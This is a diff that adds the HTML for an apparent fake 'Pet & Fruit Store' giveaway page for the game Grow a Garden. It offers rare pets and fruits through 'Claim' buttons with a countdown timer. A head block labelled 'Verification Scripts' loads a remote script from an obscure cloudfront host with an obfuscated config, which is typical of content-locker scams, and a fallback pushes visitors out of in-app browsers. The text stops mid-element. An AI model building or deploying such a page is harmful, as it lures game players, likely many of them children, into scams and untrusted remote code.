@@ -1,1 +1,944 @@
-nta zaml
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grow Garden - Pet & Fruit Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Fredoka+One&display=swap"
+        rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: url('https://i.postimg.cc/mD7zS1qn/Screenshot-2025-07-15-at-5-48-17-PM.png') no-repeat center center fixed;
+            background-size: cover;
+            position: relative;
+        }
+
+        .font-fredoka {
+            font-family: 'Fredoka One', cursive;
+        }
+
+        /* Styles for the modals */
+        .modal-backdrop {
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .price-text-old {
+            color: #f56565; /* red-500 */
+            text-shadow: 1px 1px #c53030; /* A darker red for the shadow */
+        }
+
+        /* Style for the item title stroke */
+        .item-title-stroke {
+             text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000, -2px 2px 3px rgba(0,0,0,0.3);
+        }
+
+        /* Loading Animation Styles */
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #10b981;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Progress bar animation */
+        .progress-bar {
+            width: 100%;
+            height: 1rem;
+            background-color: #374151;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981, #34d399);
+            border-radius: 0.5rem;
+            transition: width 0.5s ease-in-out;
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+        }
+
+        /* Pulsing animation for the modal title */
+        .pulse-title {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+    
+    /* Glossy card design */
+    .card-bg {
+        background: linear-gradient(145deg, #6CC24A, #58CC02);
+        border: 2px solid #3E721D;
+        box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+        transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+    }
+    .card-bg:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 10px 16px rgba(0,0,0,0.3);
+    }
+
+
+    /* Stylish quantity buttons */
+    .quantity-minus, .quantity-plus {
+        background: linear-gradient(135deg, #FFD93D, #FFB347);
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease-in-out;
+    }
+    .quantity-minus:hover, .quantity-plus:hover {
+        background: linear-gradient(135deg, #FFB347, #FF8C00);
+        transform: scale(1.1);
+    }
+
+    /* Better accessibility - text shadows for contrast */
+    .item-title-stroke {
+        text-shadow: -1px -1px 0 #333, 1px -1px 0 #333, -1px 1px 0 #333, 1px 1px 0 #333;
+    }
+    .price-text-old {
+        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    }
+
+    /* Slight transparent white overlay to make text readable on bg */
+    body::before {
+        content: "";
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(255,255,255,0.15);
+        z-index: -1;
+    }
+
+    #countdown-timer {
+        color: #ef4444; /* red-500 */
+        text-shadow: -1.5px -1.5px 0 #000, 1.5px -1.5px 0 #000, -1.5px 1.5px 0 #000, 1.5px 1.5px 0 #000;
+    }
+
+    /* Floating items background animation */
+    #floating-items-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        z-index: -2;
+    }
+
+    .floating-item {
+        position: absolute;
+        opacity: 0.25;
+        will-change: transform;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+    }
+
+    @keyframes float1 {
+        0% { transform: translate(-100px, 110vh) rotate(0deg); }
+        100% { transform: translate(110vw, -100px) rotate(720deg); }
+    }
+
+    @keyframes float2 {
+        0% { transform: translate(110vw, 110vh) rotate(0deg); }
+        100% { transform: translate(-100px, -100px) rotate(-720deg); }
+    }
+
+    @keyframes float3 {
+        0% { transform: translate(50vw, 110vh) rotate(0deg); }
+        100% { transform: translate(50vw, -100px) rotate(360deg); }
+    }
+    
+    /* In-App Browser Fallback Styles */
+    #browser-fallback {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background-color: rgba(0,0,0,0.8);
+        z-index: 9999;
+        color: white;
+        text-align: center;
+        padding: 2rem;
+    }
+    </style>
+    <!-- Verification Scripts -->
+   <script type="text/javascript">
+    var LGKjs_Uvi_VHwsqc={"it":4530694,"key":"7a8e1"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/8cb43d6.js"></script>
+</head>
+
+<body class="text-white">
+    <div id="browser-fallback">
+        <div class="flex flex-col items-center justify-center h-full">
+            <h2 class="text-3xl font-bold mb-4">Please open this page in your browser!</h2>
+            <p class="mb-6">This page works best in your phone's default browser (like Safari or Chrome).</p>
+            <a id="open-in-browser-link" href="#" target="_blank" class="bg-blue-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-600 transition-colors">Open in Browser</a>
+        </div>
+    </div>
+
+    <div id="floating-items-container"></div>
+    <div class="container mx-auto px-4 py-8">
+        <!-- Header Section -->
+        <header class="text-center mb-12">
+            <img alt="Grow A Garden Logo" class="mx-auto mb-4 w-64" src="https://i.namu.wiki/i/xpSObOe0NvUz9onMeEk6VjlXvIqdLFMqoNTRtIO0nyy3ugvOXYPQnWe02RtQSvn2PxrxONH5VHhP5JyEA2C07A.webp"/>
+            <h1 class="text-4xl md:text-5xl font-fredoka text-yellow-300 drop-shadow-lg">Pet &amp; Fruit Store</h1>
+            <div id="countdown-timer" class="text-2xl md:text-3xl font-fredoka mt-4">02:00</div>
+        </header>
+        <!-- Pet Section -->
+        <section class="mb-16" id="pets">
+            <h2 class="text-3xl font-fredoka text-center mb-8">Awesome Pets</h2>
+            <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8">
+			<!-- Pet Card: jappa Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Racoon Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/8/84/Kappa_.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Kappa</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+               <!-- Pet Card: Kitsune Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Racoon Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/4/4d/Kitsune_.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Kitsune</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+               <!-- Pet Card: Racoon Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Racoon Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Raccoon</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Primal Egg -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Fennec Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Primal Egg</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Golden Bee -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Fennec Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/e/e8/GoldenBee.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Golden Bee</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Disco Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/f/f8/T-Rex.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">T- Rex</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Disco Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/3/3c/BoneBlossomCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Bone Blossom</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Disco Bee -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Disco Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/f/f2/DiscoBeeIcon.gif"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Disco Bee</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Fennec Fox -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Fennec Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/e/e8/FennecFoxIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Fennec Fox</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+               
+                <!-- Pet Card: Mimic Octopus -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Mimic Octopus" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/0/00/MimicOctopusIcon.webp"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Mimic Octopus</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Butterfly Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Butterfly Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/1/18/Thy_Butterfly_V2.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Butterfly Pet</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Scarlet Macaw -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Scarlet Macaw" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/2/21/ScarletMacawIcon.webp"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Scarlet Macaw</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Dragonfly Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Dragonfly Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Dragonfly Pet</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Queen Bee -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Queen Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/7/7a/Queen_bee.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Queen Bee</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Red Fox -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Red Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/d/d5/RedFox.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Red Fox</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- Fruit Section -->
+        <section id="fruits">
+            <h2 class="text-3xl font-fredoka text-center mb-8">Fresh Fruits</h2>
+            <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8">
+              
+               <!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/d/da/MapleAppleProduce.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Maple Apple</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+<!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/1/11/SpikedMangoProduce.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Spiked Mango</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+              <!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Candy Blossom</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+              <!-- Fruit Card: Dragon Sapling -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/8/89/DragonSaplingCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Dragon Sapling</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Horsetail -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/4/49/HorsetailCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Horsetail</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Lingonberry -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/d/db/LingonberryCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Lingonberry</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
